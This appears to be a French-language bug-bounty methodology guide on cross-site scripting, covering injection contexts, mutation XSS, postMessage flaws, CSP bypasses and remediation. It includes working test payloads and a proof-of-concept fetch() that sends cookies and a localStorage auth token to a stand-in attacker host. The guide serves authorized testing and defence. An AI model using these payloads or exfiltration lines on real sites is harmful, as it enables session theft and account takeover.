# XSS — Cross-Site Scripting (2024-2026)

## Contexte

La XSS classique décline en fréquence sur les cibles matures (frameworks front modernes échappent par défaut : React, Vue, Angular), mais reste omniprésente dans : les widgets tiers, les emails HTML générés dynamiquement, les PDF générateurs server-side, les zones "legacy" (admin panels vieux, exports CSV/Excel avec formules), et surtout la **DOM XSS** via sinks JS mal auditées.

## Types et où les chercher en priorité

| Type | Où chercher en 2024-2026 |
|---|---|
| Reflected | Paramètres de recherche, messages d'erreur, redirections, paramètres UTM reflétés dans le HTML sans contexte JS |
| Stored | Commentaires, profils utilisateurs, noms de fichiers uploadés, champs "bio"/"description" affichés cross-utilisateur, tickets support |
| DOM-based | `innerHTML`, `document.write`, `eval`, `location.hash`/`search` non sanitizé, frameworks SPA avec `dangerouslySetInnerHTML` (React) ou `v-html` (Vue) |
| Mutation XSS (mXSS) | Sanitizers (DOMPurify anciennes versions, bleach) mal configurés — le payload mute après sanitization au moment du re-parsing DOM |
| CSP Bypass XSS | JSONP endpoints whitelistés, Angular/AngularJS legacy avec `ng-` template injection, bibliothèques CDN sur le whitelist CSP compromises/vulnérables |
| Self-XSS → escaladé | Souvent exclu seul, mais chaîné avec CSRF ou clickjacking devient exploitable à distance |

## Comment tester

### Reflected/Stored — méthode systématique

```
1. Identifier tous les points d'entrée reflétés dans la réponse (params GET/POST, headers, cookies).
2. Injecter un canari unique non-exécutable : xss_test_<random>
3. Observer le contexte d'injection exact dans la réponse HTML :
   - Dans un attribut ? Dans un tag <script> ? Dans du texte brut ? Dans un attribut event handler ?
   - Quels caractères sont échappés/filtrés (<, >, ", ', &) ?
4. Construire le payload adapté au contexte exact — jamais un payload générique copié-collé.
```

**Payloads de test contextuels :**

```html
<!-- Contexte texte brut HTML -->
<script>alert(document.domain)</script>

<!-- Contexte attribut (ex: value="INJECT") -->
"><svg onload=alert(document.domain)>

<!-- Contexte attribut avec quotes filtrées -->
autofocus onfocus=alert(document.domain)//

<!-- Contexte JS string (ex: var x = "INJECT";) -->
";alert(document.domain);//

<!-- Contexte URL (href, src) -->
javascript:alert(document.domain)

<!-- Bypass filtre balise <script> -->
<img src=x onerror=alert(document.domain)>
<svg/onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
```

### DOM XSS — analyse statique + dynamique

```bash
# Extraction des sinks dangereux dans le JS via Burp extension "DOM Invader" (intégré Burp Pro)
# ou analyse manuelle des bundles JS
grep -E "innerHTML|document\.write|eval\(|setTimeout\(.*string|location\.(hash|search)" bundle.js
```

> 💡 **Pro tip :** Active **DOM Invader** (Burp Suite Pro) en navigant normalement dans l'app — il détecte automatiquement les sinks atteignables depuis les sources contrôlables (URL, postMessage, storage) sans que tu aies à auditer le JS manuellement.

### Mutation XSS (mXSS)

Cible les sanitizers HTML côté client/serveur. Technique : injecter du HTML qui semble inoffensif après un premier parsing, mais qui **mute** lors du second passage (re-sérialisation DOM → re-parsing).

```html
<!-- Exemple classique mXSS contre DOMPurify < 2.0.x mal configuré -->
<listing>&lt;img src=1 onerror=alert(1)&gt;</listing>

<!-- Noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

> ⚠️ Teste la version exacte du sanitizer (souvent visible dans le bundle JS ou les headers) contre les CVE connues avant de perdre du temps sur du mXSS générique.

### postMessage-based XSS

```javascript
// Vérifier l'absence de validation de l'origine dans les listeners postMessage
window.addEventListener("message", function(e) {
    // Si pas de vérification e.origin === "https://trusted.com" → exploitable
    document.getElementById("output").innerHTML = e.data; // sink dangereux
});
```
PoC d'exploitation : héberger une page qui `postMessage` un payload HTML vers un iframe de la cible.

## Bypass CSP courants (2024-2026)

| Technique | Condition |
|---|---|
| JSONP endpoint whitelisté | `script-src` autorise un domaine avec un endpoint JSONP contrôlable en callback |
| `unsafe-inline` sans nonce | CSP mal configuré, encore fréquent sur legacy |
| CDN whitelisté avec lib vulnérable | AngularJS 1.x sur CDN whitelisté → template injection sandbox escape |
| `strict-dynamic` mal implémenté | Premier script de confiance qui charge dynamiquement un script contrôlable |
| Wildcard `*.exemple.com` | Sous-domaine oublié/takeover sous ce wildcard hébergeant un payload |
| Iframe injection avec `frame-src` large | Utilisation de `data:` URI si non bloqué explicitement |

> 💡 **Pro tip d'élite :** Utilise [CSP Evaluator (Google)](https://csp-evaluator.withgoogle.com/) pour auditer rapidement la politique — il détecte automatiquement les whitelist CDN dangereuses et les directives manquantes.

## Comment confirmer l'impact (au-delà de `alert(1)`)

Un `alert(1)` ne convainc jamais un triager. Démontre l'impact réel :
- **Vol de session** : exfiltration de cookie (si pas `HttpOnly`) ou de token depuis `localStorage`/`sessionStorage` vers un serveur contrôlé.
- **Account takeover** : chaîner avec un endpoint de changement d'email/mot de passe pour prouver une prise de compte complète (avec un compte de test, jamais un compte réel).
- **Actions au nom de la victime** : requêtes `fetch`/`XMLHttpRequest` authentifiées exécutées silencieusement (changement de rôle, ajout d'un admin, transfert).
- **Keylogging / phishing in-page** : overlay HTML pour capturer des credentials (à mentionner comme scénario, PoC minimal suffisant).

```javascript
// PoC d'exfiltration typique pour rapport (héberger sur webhook.site ou serveur contrôlé)
fetch('https://attacker-controlled.example/exfil?c=' + document.cookie);
fetch('https://attacker-controlled.example/exfil?t=' + localStorage.getItem('auth_token'));
```

## Remédiation (pour contextualiser la sévérité dans le rapport)

- Encodage contextuel systématique en sortie (pas juste en entrée).
- CSP stricte avec nonces, sans `unsafe-inline`/`unsafe-eval`.
- `HttpOnly` + `Secure` + `SameSite` sur les cookies de session.
- Sanitizers HTML maintenus à jour (DOMPurify récent) + Trusted Types API pour les sinks DOM.

## Références

- PortSwigger Web Security Academy — XSS
- OWASP XSS Prevention Cheat Sheet
- Google CSP Evaluator
- Recherche PortSwigger sur mXSS (Mario Heiderich)
